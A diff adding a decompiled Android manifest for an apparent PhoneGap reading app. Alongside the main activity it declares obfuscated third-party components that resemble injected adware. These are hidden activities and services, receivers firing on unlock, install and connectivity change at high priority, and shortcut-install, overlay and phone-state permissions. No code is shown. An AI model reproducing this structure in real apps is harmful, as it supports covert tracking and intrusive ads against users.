@@ -1,0 +1,239 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest
+    xmlns:android="http://schemas.android.com/apk/res/android"
+    android:versionCode="53"
+    android:versionName="1.0.3"
+    android:windowSoftInputMode="0x20"
+    android:installLocation="1"
+    package="com.meiriyiwen.app">
+
+    <uses-sdk
+        android:minSdkVersion="7" />
+
+    <supports-screens
+        android:anyDensity="true"
+        android:smallScreens="true"
+        android:normalScreens="true"
+        android:largeScreens="true"
+        android:resizeable="true"
+        android:xlargeScreens="true" />
+
+    <uses-permission
+        android:name="android.permission.INTERNET" />
+
+    <uses-permission
+        android:name="android.permission.ACCESS_NETWORK_STATE" />
+
+    <application
+        android:label="@ref/0x7f040000"
+        android:icon="@ref/0x7f020000"
+        android:debuggable="false"
+        android:hardwareAccelerated="true">
+
+        <activity
+            android:label="@ref/0x7f040000"
+            android:name=".____________"
+            android:screenOrientation="1"
+            android:configChanges="0x4b4"
+            android:windowSoftInputMode="0x0">
+
+            <intent-filter>
+
+                <action
+                    android:name="android.intent.action.MAIN" />
+
+                <category
+                    android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <activity
+            android:label="@ref/0x7f040000"
+            android:name="com.phonegap.DroidGap">
+
+            <intent-filter />
+        </activity>
+
+        <meta-data
+            android:name="j-id"
+            android:value="991050b540f24673b67c1bb83f35dd98" />
+
+        <activity
+            android:label="@string/0x1a"
+            android:name="com.zbx.qjg.Vrg"
+            android:excludeFromRecents="true"
+            android:launchMode="2"
+            android:configChanges="0xa0" />
+
+        <service
+            android:name="com.zbx.qjg.Khmv" />
+
+        <receiver
+            android:name="com.zbx.qjg.Teex">
+
+            <intent-filter>
+
+                <action
+                    android:name="android.intent.action.PACKAGE_ADDED" />
+
+                <data
+                    android:scheme="package" />
+            </intent-filter>
+
+            <intent-filter>
+
+                <action
+                    android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+            </intent-filter>
+
+            <intent-filter>
+
+                <action
+                    android:name="android.intent.action.USER_PRESENT" />
+            </intent-filter>
+        </receiver>
+
+        <activity
+            android:label="@string/0x1a"
+            android:name="com.dw.ayi.Iyon"
+            android:excludeFromRecents="true"
+            android:launchMode="2"
+            android:configChanges="0xa0" />
+
+        <service
+            android:name="com.dw.ayi.Es" />
+
+        <receiver
+            android:name="com.dw.ayi.Bk">
+
+            <intent-filter>
+
+                <action
+                    android:name="android.intent.action.PACKAGE_ADDED" />
+
+                <data
+                    android:scheme="package" />
+            </intent-filter>
+
+            <intent-filter>
+
+                <action
+                    android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+            </intent-filter>
+
+            <intent-filter>
+
+                <action
+                    android:name="android.intent.action.USER_PRESENT" />
+            </intent-filter>
+        </receiver>
+
+        <activity
+            android:label="@string/0x1a"
+            android:name="com.tsi.aspj.Zur"
+            android:excludeFromRecents="true"
+            android:launchMode="2">
+
+            <intent-filter>
+
+                <action
+                    android:name="android.intent.action.CREATE_SHORTCUT" />
+
+                <category
+                    android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </activity>
+
+        <receiver
+            android:name="com.tsi.aspj.Ygf">
+
+            <intent-filter>
+
+                <action
+                    android:name="android.intent.action.PACKAGE_ADDED" />
+
+                <data
+                    android:scheme="package" />
+            </intent-filter>
+
+            <intent-filter
+                android:priority="1000">
+
+                <action
+                    android:name="android.intent.action.USER_PRESENT" />
+
+                <action
+                    android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+            </intent-filter>
+        </receiver>
+
+        <service
+            android:name="com.tsi.aspj.Nj" />
+
+        <service
+            android:name="com.ec.xdy.Vkxp" />
+
+        <receiver
+            android:name="com.ec.xdy.Pe">
+
+            <intent-filter>
+
+                <action
+                    android:name="android.intent.action.PACKAGE_ADDED" />
+
+                <data
+                    android:scheme="package" />
+            </intent-filter>
+
+            <intent-filter
+                android:priority="1000">
+
+                <action
+                    android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+
+                <action
+                    android:name="android.intent.action.USER_PRESENT" />
+            </intent-filter>
+        </receiver>
+
+        <activity
+            android:theme="@ref/0x0103000f"
+            android:label="@string/0x1a"
+            android:name="com.ec.xdy.Vuux"
+            android:excludeFromRecents="true"
+            android:launchMode="3" />
+    </application>
+
+    <supports-screens
+        android:anyDensity="true" />
+
+    <uses-permission
+        android:name="android.permission.INTERNET" />
+
+    <uses-permission
+        android:name="android.permission.WAKE_LOCK" />
+
+    <uses-permission
+        android:name="android.permission.READ_PHONE_STATE" />
+
+    <uses-permission
+        android:name="android.permission.ACCESS_NETWORK_STATE" />
+
+    <uses-permission
+        android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+
+    <uses-permission
+        android:name="android.permission.ACCESS_WIFI_STATE" />
+
+    <uses-permission
+        android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+    <uses-permission
+        android:name="com.android.launcher.permission.INSTALL_SHORTCUT" />
+
+    <uses-permission
+        android:name="android.permission.GET_TASKS" />
+
+    <uses-permission
+        android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+</manifest>
